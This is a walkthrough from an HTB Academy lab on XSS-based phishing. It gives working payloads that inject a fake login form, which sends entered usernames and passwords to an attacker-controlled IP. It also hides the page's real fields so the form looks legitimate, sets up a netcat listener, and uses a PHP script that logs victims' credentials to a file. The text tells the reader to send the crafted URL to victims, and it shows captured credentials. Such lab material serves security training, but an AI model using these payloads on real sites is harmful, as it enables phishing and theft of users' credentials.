This is a walkthrough from  [HTB Academy](https://academy.hackthebox.com/module/103/section/984).
## XSS Discovery

Found a working XSS payload to put in the input field for the image link:
```html
'><script>alert('my alert')</script>
```

## Login Form Injection

We need to inject an HTML code that displays a login form on the targeted page. It should send login information to a server we are listening on.

We can easily find an HTML code for a basic login form, or we can write our own login form. The following example should present a login form:
```html
<h3>Please login to continue</h3>
<form action=http://OUR_IP>
    <input type="username" name="username" placeholder="Username">
    <input type="password" name="password" placeholder="Password">
    <input type="submit" name="submit" value="Login">
</form>
```

We can use the JavaScript function `document.write()` to write HTML code to the page. Once we minify our HTML code into a single line and add it inside the `write` function, the final JavaScript code should be as follows:
```javascript
'>document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');
```

The page now should look as follow:
![[xss_phishing_injected_login_form.jpg]]

## Cleaning Up

We should remove other fields (like the image URL field above), so our login form will look legit, so the users may think they have to login to use the page. For this, we can use the JavaScript function `document.getElementById().remove()`.

To find the `id` of the HTML element we want to remove, we can open the `Page Inspector Picker` by clicking [`CTRL+SHIFT+C`] and then clicking on the element we need:
![[xss_page_inspector_picker.jpg]]

We can now use this id with the `remove()` function to remove the URL form:
```javascript
document.getElementById('urlform').remove();
```

Now, once we add this code to our previous JavaScript code (after the `document.write` function), we can use this new JavaScript code in our payload:
```javascript
'>document.write('<h3>Please login to continue</h3><form action=http://10.10.14.250><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');document.getElementById('urlform').remove();
```

There is still a piece from the original HTML code left:
![[xss_phishing_injected_login_form_2.jpg]]

We can remove it by commenting it out:
```html
...PAYLOAD... <!--
```

We can now copy the final URL that should include the entire payload, and we can send it to our victims and attempt to trick them into using the fake login form. You can try visiting the URL to ensure that it will display the login form as intended.

## Credential Stealing

If we'll currently try to login using this page, we will get an error `This site can’t be reached`. Because we are not currently listening for a connection.

We can start a simple `netcat` server:
```shell-session
$ sudo nc -lvnp 80
```

When trying to login with the credentials `test:test`, this is what we get:
```shell-session
connect to [10.10.XX.XX] from (UNKNOWN) [10.10.XX.XX] XXXXX
GET /?username=test&password=test&submit=Login HTTP/1.1
Host: 10.10.XX.XX
...SNIP...
```

Since we only use a `netcat` listener, it will not handle the HTTP request properly, and the user will get an `Unable to connect` error. We can use a basic PHP script, which will log the credentials and will return the victim tot the original page.

The following PHP script should do what we need:
```php
<?php
if (isset($_GET['username']) && isset($_GET['password'])) {
    $file = fopen("creds.txt", "a+");
    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
    header("Location: http://SERVER_IP/phishing/index.php");
    fclose($file);
    exit();
}
?>
```

Now that we have our `index.php` file ready, we can start a `PHP` listening server, which we can use instead of the basic `netcat` listener we used earlier:
```shell-session
$ mkdir /tmp/tmpserver
Wildland4958@htb[/htb]$ cd /tmp/tmpserver
Wildland4958@htb[/htb]$ vi index.php #at this step we wrote our index.php file
Wildland4958@htb[/htb]$ sudo php -S 0.0.0.0:80
PHP 7.4.15 Development Server (http://0.0.0.0:80) started
```

We can check the `creds.txt` file to see the credentials:
```shell-session
$ cat creds.txt
Username: admin | Password: p1zd0nt57341myp455
```
